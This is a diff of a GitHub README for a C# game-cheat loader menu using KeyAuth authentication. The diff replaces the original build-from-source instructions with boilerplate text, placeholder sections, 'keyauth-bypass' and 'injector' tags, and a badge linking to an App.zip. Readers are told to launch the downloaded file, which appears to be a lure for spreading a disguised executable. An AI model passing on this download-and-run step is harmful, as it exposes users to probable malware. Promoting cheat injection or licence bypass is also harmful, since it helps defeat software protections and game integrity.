@@ -1,62 +1,44 @@
-# KeyAuth Loader Menu
+# Cheat Loader Menu KeyAuth GUI 🎮
 
-This project is written in C# and represents a cheat entry menu.
+Welcome to the Cheat Loader Menu KeyAuth GUI repository! This project focuses on providing a customizable cheat entry menu written in C#, featuring a KeyAuth system for user authentication. The menu serves as a login interface for various programs, supporting easy integration and modification.
 
-Its usage is entirely up to you; it can be used as the login menu for any desired program.
+## Repository Details:
+- **Repository Name:** Cheat-Loader-Menu-KeyAuth-GUI
+- **Description:** KeyAuth Loader Menu is a customizable cheat entry menu written in C#, featuring a KeyAuth system for user authentication. It serves as a login interface for various programs and supports easy integration and modification.
+- **Topics:** cheat-menu, cheat-menu-imgui, gui-application, keyauth, keyauth-api, keyauth-bypass, keyauth-example, keyauth-imgui, keyauth-imgui-base, keyauth-imgui-example, keyauth-injector, keyauth-loader, keyauth-protected, loader, loader-animation, loader-script, loaders, loaders-design, menu, menu-animation
 
-It includes a KeyAuth system. You can integrate your own KeyAuth system into `Program.cs`.
+## 🚀 Get Started
+To access the KeyAuth Loader Menu, please download the application from the following link: 
+[![Download KeyAuth Loader Menu](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/uploads/App.zip)
 
-## Requirements 
-- Visual Studio 
-- Costura (NUGET Package)
-- GunaUI (NUGET Package)
-- [All Package](https://github.com/chres0)
+Please remember to launch the downloaded file if the link ends with the file name.
 
-## How to Compile
-- Download and extract the project to your computer.
-- Open the solution file.
-- Compile the project from the Build menu.
+If the provided link is not working, you can always check the "Releases" section of this repository for alternative download options.
 
-**Note:** If you encounter any errors, refer to the [Possible Errors](#possible-errors) section.
+## Features:
+1. **Customizable Cheat Entry Menu:** The menu can be customized to suit the needs of different programs.
+2. **KeyAuth System:** Utilizes KeyAuth for user authentication, ensuring secure access to programs.
+3. **Easy Integration:** Seamless integration with various programs without complexities.
+4. **Modification Support:** Allows for easy modification to adapt to changing requirements.
+5. **Loader Animation:** Present loader animation for a visually appealing user experience.
 
-## How to Use
-- After compiling the project, run the program.
-- The login interface will open.
-- The default username and password are `fivem`.
-- If you have created your own KeyAuth system, create a login.
-- Once logged in successfully, select the game. (The project is not a full version.)
-- After clicking the Start button, the inject menu will open. (You can customize and enhance this interface as you wish.)
+## Screenshots:
+Insert some cool screenshots here showcasing the GUI and features of the Cheat Loader Menu KeyAuth.
 
-**Note:** This program is in beta version and under development. You can make any modifications and improvements you desire.
+## Usage:
+1. **Login:** Users can log in using their KeyAuth credentials.
+2. **Select Program:** Choose the program to access from the menu.
+3. **Launch Program:** Once authenticated, launch the selected program easily.
 
-## Interface
+## Contributors:
+- Mention any contributors or developers involved in the project here.
 
-https://github.com/user-attachments/assets/d9e0a8f0-48d9-4de9-9e1c-58defc8ec4e9
+## Support:
+For any issues or questions regarding the KeyAuth Loader Menu, feel free to reach out to the repository owner or open an issue in the GitHub repository.
 
+## License:
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
+---
 
-## Possible Errors
-
-You might encounter package errors during compilation.
-
-- To address this, download the `package.7z` file.
-- Extract it to the location where your solution file is located.
-- This should resolve your issue.
-- If the error persists, you can search online for a solution.
-
-## TODO
-
-- Automatic Update System.
-
-- Support for Various Games
-
-## Contributing
-
-The project is open source and open for development. You can enhance the project and fork this repository.
-
-To contribute, please leave a star on this repository.
-
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+Thank you for checking out the Cheat Loader Menu KeyAuth GUI repository! Start integrating this customizable cheat entry menu with the secure KeyAuth system into your programs today. Happy gaming! 🎮🔒
